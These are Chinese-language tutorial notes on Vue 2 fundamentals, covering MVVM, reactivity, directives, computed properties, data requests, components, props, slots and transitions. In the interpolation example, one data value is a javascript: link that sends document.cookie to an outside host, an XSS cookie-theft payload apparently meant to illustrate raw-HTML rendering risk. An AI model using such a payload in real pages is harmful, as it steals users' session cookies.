 

# Vue基础

> Vue是一个前端js框架，由前谷歌华人尤雨溪开发 

Vue近几年来特别的受关注，三年前的时候angularJS霸占前端JS框架市场很长时间，接着react框架横空出世，因为它有一个特性是虚拟DOM，从性能上碾轧angularJS，这个时候，vue1.0悄悄的问世了，它的优雅，轻便也吸引了一部分用户，开始收到关注，16年中旬，VUE2.0问世，这个时候vue不管从性能上，还是从成本上都隐隐超过了react，火的一塌糊涂。

学习vue是现在前端开发者必备的一个技能。

## [vue特点与mvvm](https://cn.vuejs.org/index.html)

### 渐进式

vue是**渐进式JavaScript框架**    用到什么功能，只需要引入什么功能模块 

- 如果只是简单的将数据与视图进行关联渲染，只需要引入vue即可实现声明式渲染
- 如果后续多个地方用到轮播图效果，那么我们可以借助vue的组件化思想进行封装
- 如果要做前端SPA单页路由，需要引入第三方插件vue-router实现路由功能
- 如果涉及多组件之间的状态管理维护，需要引入第三方插件vuex实现状态管控
- 如果项目最终上线、团队开发等需要引入webpack等构建工具进行项目打包、构建、迭代操作



<img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.mp.sohu.com%2Fupload%2F20170518%2F5783ab4ff4f046e3894388589f1d5f22.png&refer=http%3A%2F%2Fimg.mp.sohu.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1637722574&t=d03601f59eb4bbd2486f3a210cc529db" style="zoom:150%;" />



### **主张弱**

Vue可以在任意其他类型的项目中使用，使用成本较低，更灵活，主张较弱，在Vue的项目中也可以轻松融汇其他的技术来开发，并且因为Vue的生态系统特别庞大，可以找到基本所有类型的工具在vue项目中使用



### vue特点

**易用（使用成本低），灵活（生态系统完善，适用于任何规模的项目），高效（体积小，优化好，性能好）**





> Vue是一个MVVM的js框架，但是，Vue 的核心库只关注视图层，开发者关注的只是m-v的映射关系

![点击查看源网页](https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1948573003,2147545359&fm=26&gp=0.jpg)





### MV*模式（MVC/MVP/MVVM）

[mv*模式](http://www.ruanyifeng.com/blog/2015/02/mvcmvp_mvvm.html)

#### MVC

Model  View  Controller

​        用户对View操作以后，View捕获到这个操作，会把处理的权利交移给 Controller；Controller会对来自View数据进行预处理、决定调用哪个Model的接口；然后由Model执行相关的业务逻辑（数据请求）； 当Model变更了以后， View通过观察者模式收到Model变更的消息以后，然后重新更新界面。

`问题：model发生变化，view通过观察者模式监控model改变，从而渲染最新视图。这就导致View强依赖特定的 Model层`



![mvc](https://s1.ax1x.com/2020/05/23/YjRt0A.png)





![img](http://www.ruanyifeng.com/blogimg/asset/2015/bg2015020106.png)



#### MVP

Model  View  Presenter

> MVP 模式将 Controller 改名为 Presenter，同时改变了通信方向。 

​       和MVC模式一样，用户对View的操作都会从View交移给Presenter。 Presenter会执行相应的应用程序逻辑，并且对Model进行相应的操作；而这时候Model执行完业务逻辑以后，也是通过观察者模式把自己变更的消息传递出去，但是是传给Presenter而不是View。Presenter获取到Model变更的消息以后，通过View提供的接口更新界面。

![mvp](https://s1.ax1x.com/2020/05/23/YjRD1S.png)



`  各部分之间的通信，都是双向的`  

`View与Model不发生联系，都是通过Presenter进行传递` 

`View 非常薄，不部署任何业务逻辑，称为"被动视图"（Passive View），即没有任何主动性。而 Presenter非常厚，所有逻辑都部署在那里。`

`Model->View的手动同步逻辑麻烦，维护困难`





#### MVVM

Model View  ViewModel

MVVM的调用关系和MVP一样。但是，在ViewModel当中会有一个叫 Binder。你只需要在View的模版语法中，指令式地声明View上的显示的内容是和Model的哪一块数据进行绑定即可。 当ViewModel对Model进行更新的时候，Binder会自动把数据更新到View上去；当用户对View进行操作（例如表单输入），Binder也会自动的把数据更新到Model上去。这种方式称为：双向数据绑定。

> 它采用双向绑定：View的变动，自动反映在 ViewModel，反之亦然

![mvvm](https://s1.ax1x.com/2020/05/23/YjWtvF.png)






### Vue的使用

> Vue不支持IE8，因为使用了ES5的很多特性  
> Object.defineProperty(_data,"msg",{get(),set()}) 

- 可以直接通过script标签来引入vue.js，有开发版本和生产版本，开发版本一般我们在开发项目的时候引入，当最后开发完成上线的时候引入生产版本，开发版本没有压缩的，并且有很多提示，而生产版本全部删掉了

直接下载并用 <script> 标签引入，Vue 会被注册为一个全局变量。

```
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
```



- 在Vue中提供了一个脚手架（命令行工具）可以帮我们快速的搭建基于webpack的开发环境...


```
npm install ‐g @vue/cli
```



### Vue的实例

每一个应用都有一个根实例，在根实例里我们通过组件嵌套来实现大型的应用

也就是说组件不一定是必须的，但是实例是必须要有的

在实例化实例的时候我们可以传入一个；配置项，在配置项中设置很多属性方法可以实现复杂的功能


在配置中可以设置el的属性，el属性代表的是此实例的作用范围

在配置中同过设置data属性来为实例绑定数据

```
	<div id="app">
        {{msg}}
    </div>
    <!--引入开发版本  开发版本给一些警告信息-->
    <script src="./base/vue.js"></script>
    <script>

        //创建一个vue的实例
        //声明一条数据，然后用特殊的模板与法将其渲染到界面中进行显示  ====> 声明式渲染
        new Vue({       //vue的配置项
            el:"#app",  //el指代挂载点
            data:{      //vue管理的数据
                msg:"hello-world"  //msg数据一旦被vue进行管理了，msg上面就会有getter与setter
            }
        })
    </script>
```



### vue的双向数据绑定原理原理

​      当你把一个普通的 JavaScript 对象传入 Vue 实例作为 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转 为 getter/setter。Object.defineProperty 是 ES5 中一个无法模拟的特性， 这也就是 Vue 不支持 IE8 以及更低版本浏览器的原因。 每个组件实例都对应一个 watcher 实例，它会在组件渲染的过程中把“接触”过的数据属性记录为依赖。之后当依赖项的 setter 触发时，会通知 watcher，从而使它关联的组件重新渲染。



vue在创建vm的时候，会将数据配置到实例中，然后通过Object.defineProperty方法，为数据动态的添加getter与setter方法。

当获取数据的时候，会触发对应的getter方法，当设置数据的时候，触发对应的setter方法。然后当setter方法触发完成的时候，内部会进一步触发watcher,当数据改变了，视图则更新操作完毕。



> vue内部通过数据劫持&发布订阅模式实现数据的双向绑定

通过Object.defineProperty方法对所有的数据进行数据劫持，就是给这些数据动态的添加了getter与setter方法。

在数据变化的时候发布消息给订阅者（Watcher），触发响应的监听回调。

![mvvm背后原理](https://s1.ax1x.com/2020/05/23/YjWRDH.png)







扩展：

注意：Object.defineProperty有一些缺点：

 1、对象属性的新加或者删除无法监听； 

 2、数组元素的增加和删除无法监听

针对Object.defineProperty的缺点，ES6 Proxy都能够完美得解决，它唯一的缺 点就是，对IE不友好,所以vue3在检测到如果是使用IE的情况下（没错，IE11都不支持Proxy），会自动降级为Object.defineProperty的数据监听系统。





## 一.模板语法

###  (1) 插值 

​	a.文本 {{ }}   声明一条数据，然后用特殊的模板语法将其渲染出来（声明式渲染）

```
let vm = new Vue({     //vue实例的配置项
            el:"#app",//指代挂载点
            data:{    //vue所管理的数据 
                msg2:`<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>`
            }   
        })
```

​	b.表达式 {{ 表达式 }}





### (2) 指令

​	是带有 v- 前缀的特殊属性

- ​     v-bind 动态绑定属性
	 ​     v-if 动态创建/删除 
- ​     v-show 动态显示/隐藏 
- ​     v-on:click 绑定事件 
- ​     v-for 遍历 
- ​     v-model 双向绑定表单 (修饰符)
- ​     v-cloak  防止表达式闪烁

   

注：

> ​	v-cloak

给模板内的元素添加v-cloak属性后，元素在vue没有加载完的时候就有这个属性，当vue加载完成后这个属性就消失了，所以我们可以给这个属性设置css样式为隐藏

```
 <style>
    [v-cloak]{
        display:none
    }
 </style>
```

visibility:hidden  元素消失了  但后续的元素还是保持不变，不会破坏文档流结构 ===> 产生了重绘了 (repaint)
display:none   让元素消失了  后续的元素会占据消失元素的位置，破坏文档流结构 ===> 产生了回流了（reflow）



> v-text/v-html

v-text会指定将模板内元素的textContent属性替换为指令值所代表的数据

v-html可以解析标签，更改元素的innerHTML，性能比v-text较差



> v-pre

跳过元素和其子元素的编译过程，可以用来显示mustache



### (3) 缩写

v-bind:src => :src

v-on:click => @click



## 二. class与style

### (1) 绑定HTML Class

	- 对象语法
		<div id="app">
	        <p class="red">这是一个p段落标签...</p>
	        <p :class="{'red':isRed}">这是一个p段落标签...</p>  
	        <p class="red" :class="(isBig ? 'big' : '')">这是一个p段落标签...</p>
	        <p><button @click="isRed=!isRed">切换class</button></p>
	    </div>
	
	- 数组语法
		<p :class="['red',(isBig ? 'big' : '')]">这是一个p段落标签...</p>





### (2) 绑定内联样式

- 对象语法

  ```
  <p :style="{backgroundColor:background,fontSize:'40px'}">我是p段落标签...</p>
  
   //key名需要采用驼峰式的写法哦，不然会报错的！
   new Vue({
       el:"#app",
       data:{
       	background:"green"
       }
   })
  ```

  

- 数组语法

   需要将 font-size =>fontSize

```
<p :style="[{backgroundColor:background,fontSize:'40px'}]">我是p段落标签...</p>
```



## 三. 条件渲染

### (1) v-if

在Vue中可以使用v-if来控制模板里元素的显示和隐藏，值为true就显示，为false就隐藏

v-if控制的是 是否渲染这个节点





### (2)  v-else-if

当有else分支逻辑的时候，可以给该元素加上v-else指令来控制，v-else会根据上面的那个v-if来控制，效果与v-if相反，注意，一定要紧挨着

还有v-else-if指令可以实现多分支逻辑

```
<input type="text" v-model="type">
<div v-if="type === 'A'">
	A
</div>
<div v-else-if="type === 'B'">
	B
</div>
<div v-else-if="type === 'C'">
	C
</div>
<div v-else>
	Not A/B/C
</div>
```







### (3) template  v-if

当我们需要控制一组元素显示隐藏的时候，可以用template标签将其包裹，将指令设置在template上，等vm渲染这一组元素的时候，不会渲染template



### (4) v-show

Vue还提供了v-show指令，用法和v-if基本一样，控制的是元素的css中display属性，从而控制元素的显示和隐藏 ， 不能和v-else配合使用,且不能使用在template标签上，因为template不会渲染，再更改它的css属性也不会渲染，不会生效





> v-if vs v-show
>

v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。
v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做；—直到条件第一次变为真时，才会开始渲染条件块。
相比之下，v-show 就简单得多；—不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。
一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。





## 四. 列表渲染

### (1) v-for

​	这是一个指令，只要有v-的就是指令（directive 操作dom ）

​	在vue中可以通过v-for来循环数据的通知循环dom，语法是item in/of items，接收第二个参数是索引 (item,index) of items,

​	还可以遍历对象，第一个参数是value，第二个是key，第三个依然是索引

```
<div id="app">
	<ul>
		<li v-for="(item,index) in arr"> {{index+1}} 、 {{item}}</li>
	</ul>
	<ul>
		<li v-for="(value,key,index) in user">{{index}}/{{key}}:{{value}}</li>
	</ul>
</div>

new Vue({
	el:"#app",
	data:{
		arr:["苹果","梨子","香蕉"],
		user:{
			name:"张三"
		}
	}
})
```





### (2) key

*跟踪每个节点的身份，从而重用和重新排序现有元素 

*理想的 key 值是每项都有的且唯一的 id。data.id





### (3) 数组更新检测

**a. 使用以下方法操作数组，可以检测变动** 

​	push() pop() shift() unshift() splice() sort() reverse()

**b. filter(), concat() 和 slice() ,map(),新数组替换旧数组**

**c. 不能检测以下变动的数组**

​	由于 JavaScript 的限制，Vue 不能检测以下数组的变动：

​      **1.当你利用索引直接设置一个数组项时，例如：vm.items[indexOfItem] = newValue**

​        1-1.Vue.set(vm.items, indexOfItem, newValue)

​               Vue.set(vm.arr, 2, 30) //如果在实例中可以通过 this.$set(vm.arr, 2, 30)

​        1-2 vm.items.splice(indexOfItem, 1, newValue)



​      **2.当你修改数组的长度时，例如：vm.items.length = newLength**

​        vm.items.splice(newLength)







## 五. 事件处理

### (1) 监听事件-直接触发代码

在vue中还有v-on来为dom绑定事件，在v-on：后面加上要绑定的事件类型，值里可以执行一些简单javascript表达式：++ -- = ...

可以将一些方法设置在methods里，这样就可以在v-on:click的值里直接写方法名字可以，默认会在方法中传入事件对象，当写方法的时候加了()就可以传参，这个时候如果需要事件对象，那就主动传入$event

> v-on绑定的事件可以是任意事件,v-on:可以缩写为@     v-on:click  ===> @click
>


为什么在 HTML 中监听事件?

你可能注意到这种事件监听的方式违背了关注点分离 (separation of concern) 这个长期以来的优良传统。但不必担心，因为所有的 Vue.js 事件处理方法和表达式都严格绑定在当前视图的 ViewModel 上，它不会导致任何维护上的困难。实际上，使用 v-on 有几个好处：

1. 扫一眼 HTML 模板便能轻松定位在 JavaScript 代码里对应的方法。
2. 因为你无须在 JavaScript 里手动绑定事件，你的 ViewModel 代码可以是非常纯粹的逻辑，和 DOM 完全解耦，更易于测试。
3. 当一个 ViewModel 被销毁时，所有的事件处理器都会自动被删除。你无须担心如何自己清理它们。

### (2) 方法事件处理器-写函数名 handleClick

```
<div v-on:click="clickme($event,1,2)">点我</div>

<script>
	new Vue({
		methods:{
			clickme(e,a,b){
				console.log(e事件对象，1，2)
			}
		}
	})

</script>
```



### (3) 内联处理器方法-执行函数表达式

​	 handleClick($event)   $event 事件对象



### (4) [事件修饰符](https://cn.vuejs.org/v2/guide/events.html) 

​    .stop 

​	.prevent  

​	.self

​	 .once



### (5) 按键修饰符

@keyup.enter





## 六. 表单控件绑定/双向数据绑定

​	v-model

### 	(1) 基本用法



### 	(2) 修饰符

-  .lazy :失去焦点同步一次 
- .number :格式化数字
-  .trim : 去除首尾空格







## 七. 计算属性

​	复杂逻辑，模板难以维护

### 	(1) 基础例子

有的时候我们需要在模板中使用数据a，这个时候就需要用到表达式，但是有的地方我们需要对a数据进行一些简单的处理后才能使用，那么我们就会在表达式中写一些js逻辑运算

```
<div id="example">
 {{ message.split('').reverse().join('') }}
</div>
```

这样我们的维护就会非常困难，也不便于阅读



### 	(2) 计算缓存 vs methods

我们就可以在methods里设置一个方法，在模板的表达式中使用这个方法

```
// 在组件中
methods: {
    reversedMessage: function () {
        return this.message.split('').reverse().join('')
    }
}
```

但是这个时候，只要vm中有数据变化，这个变化的数据可能和我们关注的数据无关，但是vm都会重新渲染模板，这个时候表达式中的方法就会重新执行，大大的影响性能

### 	(3) data vs computed vs watch

这个时候其实我们可以使用监听器里完成：

在vm实例中设置watch属性，在里面通过键值对来设置一些监听，键名为数据名，值可以是一个函数，这个函数在数据改变之后才会执行，两个参数分别是更改前的值和更改后的值

```
 watch:{
        a: function (val, oldVal) {
            console.log('new: %s, old: %s', val, oldVal)
        }
    }
```



值还可以是一个方法名字，当数据改变的时候这个方法会执行

当数据为object的时候，object的键值对改变不会被监听到（数组的push等方法可以）,这个时候需要设置深度监听：

```
c: {
        deep:true,
        handler:function (val, oldVal) {
            console.log('new: %s, old: %s', val, oldVal)
        }
    },
```



监听的handler函数前面的这几种写法都是在数据变化的时候才会执行，初始化的时候不会执行，但是如果设置immediate为true就可以了

```
watch:{
        num(newValue,oldValue){ //这样去写的话不会主动执行一次，需要更改依赖项的时候，才会执行！
        },
        num:{
            immediate:true, //初始化的时候主动执行一次handler
            handler:function(newValue,oldValue){
                this.nums = newValue*2
            }
        }
    }
```

我们在回到上面的问题，用监听器加上immediate属性就可以做到该效果，但是大家可以看到的是逻辑稍稍有点复杂



> 我们一般都会用到一个叫计算属性的东西来解决：



计算属性就是在实例配置项中通过computed来为vm设置一个新的数据，而这个新数据会拥有一个依赖（一条已经存在的数据），当依赖发生变化的时候，新数据也会发生变化

与方法的方式相比，它性能更高，计算属性是基于它们的依赖进行缓存的。计算属性只有在它的相关依赖发生改变时才会重新求值。相比之下，每当触发重新渲染时，调用方法将总会再次执行函数。

与watch相比，写起来简单，逻辑性更清晰，watch一般多用于，根据数据的变化而执行某些动作，而至于这些动作是在干什么其实无所谓，而计算属性更有针对性，根据数据变化而更改另一个数据

计算属性也拥有getter和setter，默认写的是getter，设置setter可以当此计算属性数据更改的时候去做其他的一些事情，相当于watch这个计算属性

```
 xm:{
        get:function(){//getter 当依赖改变后设置值的时候
            return this.xing+'丶'+this.ming
        },
        set:function(val){//setter 当自身改变后执行
            this.xing = val.split('丶')[0]
            this.ming = val.split('丶')[1]
        }
    }
```











## 八. Mixins

​	混入 (mixins) 是一种分发 Vue 组件中可复用功能的非常灵活的方式。 

​	混入对象可以包含任意组件选项。 

​	当组件使用混入对象时，所有混入对象的选项将被混入该组件本身的选项。

```
<div id="app" v-cloak>
    <p @click="a">{{msg}}</p>
    <p>{{aaa}}</p>
  </div>
  
  
  let common = {
        methods:{
          a(){
            console.log("a")
          }
        },
        computed:{
          aaa(){
            return "我是计算属性"
          }
        }
  }  
  
  
  new Vue({
        el:"#app",
        mixins:[common],
        data:{
          msg:"hello world"
        }
  })

```









## 九. 数据请求

###  (1) vue-resource请求

从vue的2.0开始，作者说：vue-resource不再维护了







### (2) fetch请求（规范）

> why: XMLHttpRequest 是一个设计粗糙的 API，配置和调用方式非常混乱， 而且基于事件的异步模型写起来不友好。 
>
> 查看兼容性： https://caniuse.com/#search=fetch

兼容性不好 polyfill: https://github.com/camsong/fetch-ie8

通过polyfill插件实现fetch兼容？判断浏览器支不支持fetch，如果支持就用，如果不支持就使用原生XMLHttpRequest进行请求，就可以实现ie8+.



```
1 //get
2 fetch("**").then(res=>res.json()).then(res=>{console.log(res)})
3 fetch("**").then(res=>res.text()).then(res=>{console.log(res)})


4 //post
fetch("http://localhost:3000/add",{
    method:'post', //请求方法
    headers: {    //设置请求头
    	"Content-Type":"application/x-www-form-urlencoded"
    },
    body: "name=张三&age=100"  //传递的参数
}).then(res=>res.json()).then(res=>{console.log(res)});




//需要在服务器同源下测试
function post(){
    fetch("http://localhost:3000/add",{
    	method:'post',
    	// credentials: 'include',
    headers: {
    	"Content-Type":"application/json"
    },
    body:JSON.stringify({
        name:'张三丰',
        age:10
    })
    }).then(res=>res.json()).then(res=>{console.log(res)});
}
```

** Fetch 请求默认是不带 cookie 的，需要设置 fetch(url, {credentials: 'include'})*





### (3) axios请求

```
// get
axios.get("json/test.json?name=zhangsan&age=10").then(res=>{
    // res.data 才是真正的后端数据
    console.log(res.data.data.films)
    this.datalist = res.data.data.films
})


//post -1- x-www-form-urlencode
axios.post("json/test.json","name=zhangsan&age=10").then(res=>{
	console.log(res.data)
})

//post -2- application/json
axios.post("json/test.json",{
    name:"zhangsan",
    age:100
}).then(res=>{
    console.log(res.data)
})
```









## 十. 组件使用

###  (1)组件化

模块化就是将系统功能分离成独立的功能部分的方法，一般指的是单个的某一种东西，例如js、css

而组件化针对的是页面中的整个完整的功能模块划分，组件是一个html、css、js、image等外链资源，这些部分组成的一个聚合体

> 优点：代码复用，便于维护

划分组件的原则：复用率高的，独立性强的

组件应该拥有的特性：可组合，可重用，可测试，可维护





###  (2)组件

在vue中，我们通过**Vue.extend来创建Vue的子类**，这个东西其实就是组件

也就是说Vue实例和组件的实例有差别但是差别不大，因为毕竟一个是父类一个是子类

一般的应用，会拥有一个根实例，在根实例里面都是一个一个的组件

因为组件是要嵌入到实例或者父组件里的，也就是说，组件可以互相嵌套，而且，所有的组件最外层必须有一个根实例，**所以组件分为：全局组件和局部组件**

***全局组件在任意的实例、父级组件中都能使用，局部组件只能在创建自己的父级组件或者实例中使用***

创建组件：

```
Vue.extend(options)
```

**全局注册：**

```
var App = Vue.extend({
	template:"<h1>hello world</h1>"
})
Vue.component('my-app',App)
```

简便写法：

```
// 创建组件构造器和注册组件合并一起  
Vue.component('hello',{//Vue会自动的将此对象给Vue.extend
	template:"<h1>hello</h1>"
})
```



> 组件通过template来确定自己的模板,template里的模板必须有根节点，标签必须闭合
>

> **组件的属性挂载通过：data方法来返回一个对象作为组件的属性，这样做的目的是为了每一个组件实例都拥有独立的data属性**



**局部注册：**

```
new Vue({
    el:"#app",
    components:{
    	'my-app':App
    }
})
```

简便写法：

```
 data:{},
    components:{
        'hello':{
            template:"<h1>asdasdasdasdasdas</h1>"
        }
    }
```

在实例或者组件中注册另一个组件，这个时候，被注册的组件只能在注册它的实例或组件的模板中使用，一个组件可以被多个组件或实例注册



> 注意浏览器规则

因为vue在解析模板的时候会根据某些html的规则，例如，在table里只能放tr,td,th..，如果放入组件不会解析 这个时候我们可以放入tr使用is方式来标识这个tr其实是组件

```
<table id="app">
    <tr is="hello"></tr>
</table>
```



> template

```
<template id="my-hello">
    <div>
        <h1>hello world</h1>
        <p>hahahah</p>
    </div>
</template>
//组件中
template:"#my-hello"
```



> is切换

在实例、组件的模板中的某一个标签上，可以通过is属性来指定为另一个目标的组件，这个时候我们一般会使用component标签来占位、设置is属性来指定目标组件

```
<component :is="type"></component>

//组件中
data:{
    type:'aaa'
},
components:{
    'aaa':{template:"<h1>AAAAAAAAAAAAA</h1>"},
    'bbb':{template:"<h1>BBBBBBBBBBBBB</h1>"}
}
```



> 组件嵌套

应用中划分的组件可能会很多，为了更好的实现代码复用，所以必然会存在组件的嵌套关系

组件设计初衷就是要配合使用的，最常见的就是形成父子组件的关系：组件 A 在它的模板中使用了组件 B。







###  (3)过滤器



vue中可以设置filter(过滤器)来实现数据格式化，双花括号插值和 v-bind 表达式中使用

vue1.0的有默认的过滤器，但是在2.0的时候全部给去掉了

所以在vue中如果想要使用过滤器就需要自定义

自定义的方法有两种：全局定义和局部定义，
全局定义的过滤器在任意的实例、组件中都可以使用，
局部定义就是在实例、组件中定义，只能在这个实例或组件中使用

1. **全局定义**

   Vue.filter(name,handler)

   name是过滤器的名字，handler是数据格式化处理函数，接收的第一个参数就是要处理的数据，返回什么数据，格式化的结果就是什么

   在模板中通过 | (管道符) 来使用,在过滤器名字后面加（）来传参，参数会在handler函数中第二个及后面的形参来接收

```
 <p>{{msg | firstUpper(3,2)}}</p>

Vue.filter('firstUpper',function (value,num=1,num2) {
	console.log(num2)
	return value.substr(0,num).toUpperCase()+value.substr(num).toLowerCase()
})
```

2. **局部定义**

   在实例、组件的配置项中设置 filters，键名为过滤器名，值为handler

```
    filters:{
        firstUpper:function (value,num=1,num2) {
            console.log(num2)
            return value.substr(0,num).toUpperCase()+value.substr(num).toLowerCase()
        }
    }
```











###  (4)虚拟dom

频繁且复杂的dom操作通常是前端性能瓶颈的产生点，Vue提供了虚拟dom的解决办法

虚拟的DOM的核心思想是：对复杂的文档DOM结构，提供一种方便的工具，进行最小化地DOM操作。这句话，也许过于抽象，却基本概况了虚拟DOM的设计思想

(1) 提供一种方便的工具，使得开发效率得到保证
(2) 保证最小化的DOM操作，使得执行效率得到保证


也就是说，虚拟dom的框架/工具都是这么做的：

1. 根据虚拟dom树最初渲染成真实dom
2. 当数据变化，或者说是页面需要重新渲染的时候，会重新生成一个新的完整的虚拟dom
3. 拿新的虚拟dom来和旧的虚拟dom做对比（使用diff算法）。得到需要更新的地方之后，更新内容

这样的话，就能大量减少真实dom的操作,提高性能

<img src="https://s1.ax1x.com/2020/05/25/tpHcBn.png" alt="diff" style="zoom: 80%;" />



> 什么是虚拟dom？与key值的关系？
>     Virual DOM是用JS对象记录一个dom节点的副本，当dom发生更改时候，先用虚拟dom进行diff，算出最小差异，然后再修改真实dom。

    当用传统的方式操作DOM的时候，浏览器会从构建DOM树开始从头到尾执行一遍流程，效率很低。而虚拟DOM是用javascript对象表示的，而操作javascript是很简便高效的。虚拟DOM和真正的DOM有一层映射关系，很多需要操作DOM的地方都会去操作虚拟DOM，最后统一一次更新DOM。因而可以提高性能



#### 虚拟DOM的Diff算法

> 虚拟DOM中，在DOM的状态发生变化时，虚拟DOM会进行Diff运算，来更新只需要被替换的DOM，而不是全部重绘。
> 在Diff算法中，只平层的比较前后两棵虚拟DOM树的节点，没有进行深度的遍历。

1.如果节点类型改变，直接将旧节点卸载，替换为新节点，旧节点包括下面的子节点都将被卸载，如果新节点和旧节点仅仅是类型不同，但下面的所有子节点都一样时，这样做也是效率不高的一个地方。
2.节点类型不变，属性或者属性值改变，不会卸载节点，执行节点更新的操作。
3.文本改变，直接修改文字内容。
4.移动，增加，删除子节点时：



如果想在中间插入节点F，简单粗暴的做法是：卸载C，装载F，卸载D，装载C，卸载E，装载D，装载E。如下图：



![key1](https://s1.ax1x.com/2020/05/25/tpHX4K.png)

写代码时，如果没有给数组或枚举类型定义一个key，就会采用上面的粗暴算法。
如果为元素增加key后，Vue就能根据key，直接找到具体的位置进行操作，效率比较高。如下图：

> 本寻着key值相同的即可复用的原则。![key2](https://s1.ax1x.com/2020/05/25/tpHLAx.png)

***在v-for中提供key，一方面可以提高性能，一方面也会避免出错***



[虚拟dom概括理解](https://blog.csdn.net/mrliber/article/details/79036828)

[虚拟dom与key的关系](https://blog.csdn.net/weixin_42695446/article/details/84680213)











### (5) 组件之间的通信

> 自定义组件需要有一个root element 
>
> 父子组件的data是无法共享 
>
> 组件可以有data，methods,computed....,但是data 必须是一个函数



#### props传递数据

组件实例的作用域是孤立的,父组件不能直接使用子组件的数据，子组件也不能直接使用父组件的数据

父组件在模板中使用子组件的时候可以给子组件传递数据

```
 <bbb money="2"></bbb>
```

子组件需要通过props属性来接收后才能使用

```
'bbb':{
    props:['money']
}
```

如果父组件传递属性给子组件的时候键名有'-'，子组件接收的时候写成小驼峰的模式

```
  <bbb clothes-logo='amani' clothes-price="16.58"></bbb>
  props:['clothesLogo','clothesPrice']   子组件模板中：{{clothesLogo}}
```

我们可以用 v-bind 来动态地将 prop 绑定到父组件的数据。每当父组件的数据变化时，该变化也会传导给子组件







#### 单向数据流

Prop 是单向绑定的：当父组件的属性变化时，将传递给子组件，但是反过来不会。这是为了防止子组件无意间修改了父组件的状态，来避免应用的数据流变得难以理解。

另外，每次父组件更新时，子组件的所有 prop 都会更新为最新值。这意味着你不应该在子组件内部改变 prop。如果你这么做了，Vue 会在控制台给出警告。



> 注意在 JavaScript 中对象和数组是引用类型，指向同一个内存空间，如果 prop 是一个对象或数组，在子组件内部改变它会影响父组件的状态。  message:{val:""}





#### prop验证

我们可以为组件的 prop 指定验证规则。如果传入的数据不符合要求，Vue 会发出警告。这对于开发给他人使用的组件非常有用

验证主要分为：类型验证、必传验证、默认值设置、自定义验证

```
props:{
    //类型验证:
    str:String,
    strs:[String,Number],
    //必传验证
    num:{
        type:Number,
        required:true
    },
    //默认数据
    bool:{
        type:Boolean,
        // default:true,
        default:function(){
            return true
        }
    },
    //自定义验证函数
    //props:["nums"]
    props:{
        nums:{
            type:Number, //[Number,String,Boolean,Array]
            validator: function (value) {
                return value %2 == 0
            }
        }
    }
}
```

**当父组件传递数据给子组件的时候，子组件不接收，这个数据就会挂载在子组件的模板的根节点上**







#### slot插槽

vue里提供了一种将父组件的内容和子组件的模板整合的方法：内容分发，通过slot插槽来实现

<img src="https://s1.ax1x.com/2020/05/25/tpb9ud.png" alt="slot" style="zoom: 67%;" />

> ##### 匿名插槽
>
> 在父组件中使用子组件的时候，在子组件标签内部写入内容。在子组件的模板中可以通过<slot></slot>来使用

```
<div id="app">
    <hello>
        <div>联通卡</div>
        <div>移动卡</div>
    </hello>
</div>

<template id="hello">
    <div>
    	<slot></slot>
    </div>
</template>
```





> ##### 具名插槽
>
> 父组件在子组件标签内写的多个内容我们可以给其设置slot属性来命名，在子组件的模板通过通过使用带有name属性的slot标签来放置对应的slot。



```
<div id="app">
    <hello>
        <div slot="b">联通卡</div>
        <div slot="a">移动卡</div>
    </hello>
</div>

<template id="hello">
    <div>
        <slot name="a"></slot>
        <hr/>
        <slot name="b"></slot>
    </div>
</template>
```





> ##### 新版本2.6+支持v-slot方式 (作用域插槽)
>
> v-slot在使用时，需要在template标签内，这点大家要注意

```
<hello>
    <template v-slot:a>
        <div>联通卡</div>
    </template>
    <template v-slot:b>
        <div>移动卡</div>
    </template>
</hello>


<template id="hello">
    <div>
        <slot name="a" ></slot>
        <slot name="b" ></slot>
    </div>
</template>
```





> 接受props的具名槽口



<slot name="b" :msgb="msg"></slot>

<template v-slot:b="info"></template>
```
<div id="app">
    <hello>
        <template v-slot:a>
        	<div>联通卡</div>
        </template>
        <template v-slot:b="info">
        	<div>移动卡 {{info.msgb}}</div>
        </template>
    </hello>
</div>

<template id="hello">
    <div>
        <slot name="a" ></slot>
        <slot name="b" :msgb="msg"></slot>
    </div>
</template>


 Vue.component("hello",{
     template:"#hello",
     data(){
         return {
         	msg:"你好"
         }
     }
 })
```









#### 组件之间通信方式

i. 父子组件传值 (**props down, events up**) 

![props emit](https://s1.ax1x.com/2020/05/25/tpbFEt.png)



ii. 属性验证 props:{name:Number} Number,String,Boolean,Array,Object,Function,null(不限制类型) 



iii. Ref 

> ​	this.$refs.child

![ref](https://s1.ax1x.com/2020/05/25/tpbVC8.png)



iv. 事件总线 

​	var bus = new Vue()

​    *mounted生命周期中进行监听

<img src="https://s1.ax1x.com/2020/05/25/tpbKDs.png" alt="event bus" style="zoom:67%;" />

##### `扩展`

###### ***v-once 用在组件上有什么用？***

只渲染元素和组件**一次**。随后的重新渲染，元素/组件及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能。

```
<!-- 单个元素 -->
<span v-once>This will never change: {{msg}}</span>

<!-- 有子元素 -->
<div v-once>
  <h1>comment</h1>
  <p>{{msg}}</p>
</div>

<!-- 组件 -->
<my-component v-once :comment="msg"></my-component>

<!-- `v-for` 指令-->
<ul>
  <li v-for="i in list" v-once>{{i}}</li>
</ul>
```







###### ***v-model 可以用在组件通信？***

可以的。在组件上面使用v-model指令，相当于绑定了value属性与监听input事件。





#### transition过渡

Vue 在插入、更新或者移除 DOM 时，提供多种不同方式的应用过渡效果。

![transition](https://s1.ax1x.com/2020/05/25/tpblEq.png)

Vue提供了transition组件来帮助我们实现过渡效果，依据就是在控制元素显示隐藏的时候为dom在指定的时刻添加上对应的类名

而我们只要在这些类名里写上对应的css样式

在进入/离开的过渡中，会有 6 个 class 切换(v代表的是transition的name属性的值)。

